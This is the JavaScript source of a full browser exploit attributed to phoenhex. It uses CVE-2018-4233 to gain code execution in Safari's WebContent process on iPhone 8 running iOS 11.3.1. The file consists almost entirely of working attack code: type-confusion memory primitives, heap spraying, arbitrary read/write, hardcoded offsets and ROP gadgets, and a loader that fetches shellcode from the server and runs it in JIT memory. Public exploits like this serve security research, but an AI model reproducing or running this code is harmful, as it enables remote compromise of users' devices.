/*
 * Exploit by @_niklasb from phoenhex.
 *
 * This exploit uses CVE-2018-4233 (by saelo) to get RCE in WebContent.
 * The second stage is currently Ian Beer's empty_list kernel exploit,
 * adapted to use getattrlist() instead of fgetattrlist().
 *
 * Thanks to qwerty for some Mach-O tricks.
 *
 * Offsets hardcoded for iPhone 8, iOS 11.3.1.
 */
print = alert
ITERS = 10000
ALLOCS = 1000

var conversion_buffer = new ArrayBuffer(8)
var f64 = new Float64Array(conversion_buffer)
var i32 = new Uint32Array(conversion_buffer)

var BASE32 = 0x100000000
function f2i(f) {
    f64[0] = f
    return i32[0] + BASE32 * i32[1]
}

function i2f(i) {
    i32[0] = i % BASE32
    i32[1] = i / BASE32
    return f64[0]
}

function hex(x) {
    if (x < 0)
        return `-${hex(-x)}`
    return `0x${x.toString(16)}`
}

function xor(a, b) {
    var res = 0, base = 1
    for (var i = 0; i < 64; ++i) {
        res += base * ((a&1) ^ (b&1))
        a = (a-(a&1))/2
        b = (b-(b&1))/2
        base *= 2
    }
    return res
}

function fail(x) {
    print('FAIL ' + x)
    throw null
}

counter = 0

// CVE-2018-4233
function trigger(constr, modify, res, val) {
    return eval(`
    var o = [13.37]
    var Constructor${counter} = function(o) { ${constr} }

    var hack = false

    var Wrapper = new Proxy(Constructor${counter}, {
        get: function() {
            if (hack) {
                ${modify}
            }
        }
    })

    for (var i = 0; i < ITERS; ++i)
        new Wrapper(o)

    hack = true
    var bar = new Wrapper(o)
    ${res}
    `)
}

var workbuf = new ArrayBuffer(0x1000000)
var u32_buffer = new Uint32Array(workbuf)
var u8_buffer = new Uint8Array(workbuf)
var shellcode_length

function pwn() {
    var stage1 = {
        addrof: function(victim) {
            return f2i(trigger('this.result = o[0]', 'o[0] = val', 'bar.result', victim))
        },

        fakeobj: function(addr) {
            return trigger('o[0] = val', 'o[0] = {}', 'o[0]', i2f(addr))
        },

        test: function() {
            var addr = this.addrof({a: 0x1337})
            var x = this.fakeobj(addr)
            if (x.a != 0x1337) {
                fail(1)
            }
        },
    }

    // Sanity check
    stage1.test()

    var structure_spray = []
    for (var i = 0; i < 1000; ++i) {
        var ary = {a:1,b:2,c:3,d:4,e:5,f:6,g:0xfffffff}
        ary['prop'+i] = 1
        structure_spray.push(ary)
    }

    var manager = structure_spray[500]
    var leak_addr = stage1.addrof(manager)
    //print('leaking from: '+ hex(leak_addr))

    function alloc_above_manager(expr) {
        var res
        do {
            for (var i = 0; i < ALLOCS; ++i) {
                structure_spray.push(eval(expr))
            }
            res = eval(expr)
        } while (stage1.addrof(res) < leak_addr)
        return res
    }

    var unboxed_size = 100

    var unboxed = alloc_above_manager('[' + '13.37,'.repeat(unboxed_size) + ']')
    var boxed = alloc_above_manager('[{}]')
    var victim = alloc_above_manager('[]')

    // Will be stored out-of-line at butterfly - 0x10
    victim.p0 = 0x1337
    function victim_write(val) {
        victim.p0 = val
    }
    function victim_read() {
        return victim.p0
    }

    i32[0] = 0x200                // Structure ID
    i32[1] = 0x01082007 - 0x10000 // Fake JSCell metadata, adjusted for boxing
    var outer = {
        p0: 0, // Padding, so that the rest of inline properties are 16-byte aligned
        p1: f64[0],
        p2: manager,
        p3: 0xfffffff, // Butterfly indexing mask
    }

    var fake_addr = stage1.addrof(outer) + 0x20
    //print('fake obj @ ' + hex(fake_addr))

    var unboxed_addr = stage1.addrof(unboxed)
    var boxed_addr = stage1.addrof(boxed)
    var victim_addr = stage1.addrof(victim)
    //print('leak ' + hex(leak_addr)
        //+ '\nunboxed ' + hex(unboxed_addr)
        //+ '\nboxed ' + hex(boxed_addr)
        //+ '\nvictim ' + hex(victim_addr))

    var holder = {fake: {}}
    holder.fake = stage1.fakeobj(fake_addr)

    // From here on GC would be uncool

    // Share a butterfly for easier boxing/unboxing
    var shared_butterfly = f2i(holder.fake[(unboxed_addr + 8 - leak_addr) / 8])
    var boxed_butterfly = holder.fake[(boxed_addr + 8 - leak_addr) / 8]
    holder.fake[(boxed_addr + 8 - leak_addr) / 8] = i2f(shared_butterfly)

    var victim_butterfly = holder.fake[(victim_addr + 8 - leak_addr) / 8]
    function set_victim_addr(where) {
        holder.fake[(victim_addr + 8 - leak_addr) / 8] = i2f(where + 0x10)
    }
    function reset_victim_addr() {
        holder.fake[(victim_addr + 8 - leak_addr) / 8] = victim_butterfly
    }

    var stage2 = {
        addrof: function(victim) {
            boxed[0] = victim
            return f2i(unboxed[0])
        },

        fakeobj: function(addr) {
            unboxed[0] = i2f(addr)
            return boxed[0]
        },

        write64: function(where, what) {
            set_victim_addr(where)
            victim_write(this.fakeobj(what))
            reset_victim_addr()
        },

        read64: function(where) {
            set_victim_addr(where)
            var res = this.addrof(victim_read())
            reset_victim_addr()
            return res
        },

        write_non_zero: function(where, values) {
            for (var i = 0; i < values.length; ++i) {
                if (values[i] != 0)
                    this.write64(where + i*8, values[i])
            }
        },

        test: function() {
            this.write64(boxed_addr + 0x10, 0xfff) // Overwrite index mask, no biggie
            if (0xfff != this.read64(boxed_addr + 0x10)) {
                fail(2)
            }
        },

        forge: function(values) {
            for (var i = 0; i < values.length; ++i)
                unboxed[1 + i] = i2f(values[i])
            return shared_butterfly + 8
        },

        clear: function() {
            outer = null
            holder.fake = null
            for (var i = 0; i < unboxed_size; ++i)
                boxed[0] = null
        },
    }

    // Test read/write
    stage2.test()

    var wrapper = document.createElement('div')

    var wrapper_addr = stage2.addrof(wrapper)
    var el_addr = stage2.read64(wrapper_addr + 0x20)
    var vtab_addr = stage2.read64(el_addr)

    // Various offsets here
    var slide = stage2.read64(vtab_addr) - 0x189c9a808
    var disablePrimitiveGigacage = 0x18851a7d4 + slide
    var callbacks = 0x1b335bd28 + slide
    var g_gigacageBasePtrs = 0x1b1d08000 + slide
    var g_typedArrayPoisons = 0x1b335d720 + slide
    var longjmp = 0x180b126e8 + slide
    var dlsym = 0x18084ef90 + slide

    var startOfFixedExecutableMemoryPool = stage2.read64(0x1b335d0b8 + slide)
    var endOfFixedExecutableMemoryPool = stage2.read64(0x1b335d0c0 + slide)
    var jitWriteSeparateHeapsFunction = stage2.read64(0x1b335d0c8 + slide)
    var useFastPermisionsJITCopy = stage2.read64(0x1b1d04018 + slide)

    var ptr_stack_check_guard = 0x1ac3efc40 + slide

    // ModelIO:0x000000018d2f6564 :
    //   ldr x8, [sp, #0x28]
    //   ldr x0, [x8, #0x18]
    //   ldp x29, x30, [sp, #0x50]
    //   add sp, sp, #0x60
    //   ret
    var pop_x8 = 0x18d2f6564 + slide

    // CoreAudio:0x000000018409ddbc
    //   ldr x2, [sp, #8]
    //   mov x0, x2
    //   ldp x29, x30, [sp, #0x10]
    //   add sp, sp, #0x20
    //   ret
    var pop_x2 = 0x18409ddbc + slide

    // see jitcode.s
    var linkcode_gadget = 0x187bd18c8 + slide

    //print('base @ ' + hex(base)
        //+ '\ndisablePrimitiveGigacage @ ' + hex(disablePrimitiveGigacage)
        //+ '\ng_gigacageBasePtrs @ ' + hex(g_gigacageBasePtrs)
        //+ '\ng_typedArrayPoisons @ ' + hex(g_typedArrayPoisons)
        //+ '\nstartOfFixedExecutableMemoryPool @ ' + hex(startOfFixedExecutableMemoryPool)
        //+ '\nendOfFixedExecutableMemoryPool @ ' + hex(endOfFixedExecutableMemoryPool)
        //+ '\njitWriteSeparateHeapsFunction @ ' + hex(jitWriteSeparateHeapsFunction)
        //+ '\nuseFastPermisionsJITCopy @ ' + hex(useFastPermisionsJITCopy)
        //)

    if (!useFastPermisionsJITCopy || jitWriteSeparateHeapsFunction) {
        // Probably an older phone, should be even easier
        fail(3)
    }
    var callback_vector = stage2.read64(callbacks)

    var poison = stage2.read64(g_typedArrayPoisons + 6*8)
    var buffer_addr = xor(stage2.read64(stage2.addrof(u32_buffer) + 0x18), poison)

    var shellcode_src = buffer_addr + 0x4000
    var shellcode_dst = endOfFixedExecutableMemoryPool - 0x1000000
    if (shellcode_dst < startOfFixedExecutableMemoryPool) {
        fail(4)
    }
    stage2.write64(shellcode_src + 4, dlsym)

    var fake_stack = [
        0,
        shellcode_length,  // x2
        0,

        pop_x8,

        0, 0, 0, 0, 0,
        shellcode_dst, // x8
        0, 0, 0, 0,
        stage2.read64(ptr_stack_check_guard) + 0x58,

        linkcode_gadget,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,

        shellcode_dst,
    ]

    // Set up fake vtable at offset 0
    u32_buffer[0] = longjmp % BASE32
    u32_buffer[1] = longjmp / BASE32

    // Set up fake stack at offset 0x2000
    for (var i = 0; i < fake_stack.length; ++i) {
        u32_buffer[0x2000/4 + 2*i] = fake_stack[i] % BASE32
        u32_buffer[0x2000/4 + 2*i+1] = fake_stack[i] / BASE32
    }

    stage2.write_non_zero(el_addr, [
        buffer_addr, // fake vtable
        0,
        shellcode_src, // x21
        0, 0, 0, 0, 0, 0, 0,
        0, // fp

        pop_x2, // lr
        0,
        buffer_addr + 0x2000, // sp
    ])
    //print('shellcode @ ' + hex(shellcode_dst))
    print('see you on the other side')
    wrapper.addEventListener('click', function(){})
}

function print_error(e) {
    print('Error: ' + e + '\n' + e.stack)
}

function go() {
    fetch('/shellcode.bin').then((response) => {
        response.arrayBuffer().then((buffer) => {
            try {
                shellcode_length = buffer.byteLength
                if (shellcode_length > 0x1000000) {
                    fail(5)
                }
                u8_buffer.set(new Uint8Array(buffer), 0x4000)
                //print('got ' + shellcode_length + ' bytes of shellcode, pwning')
                pwn()
            } catch (e) {
                print_error(e)
            }
        })
    })
}
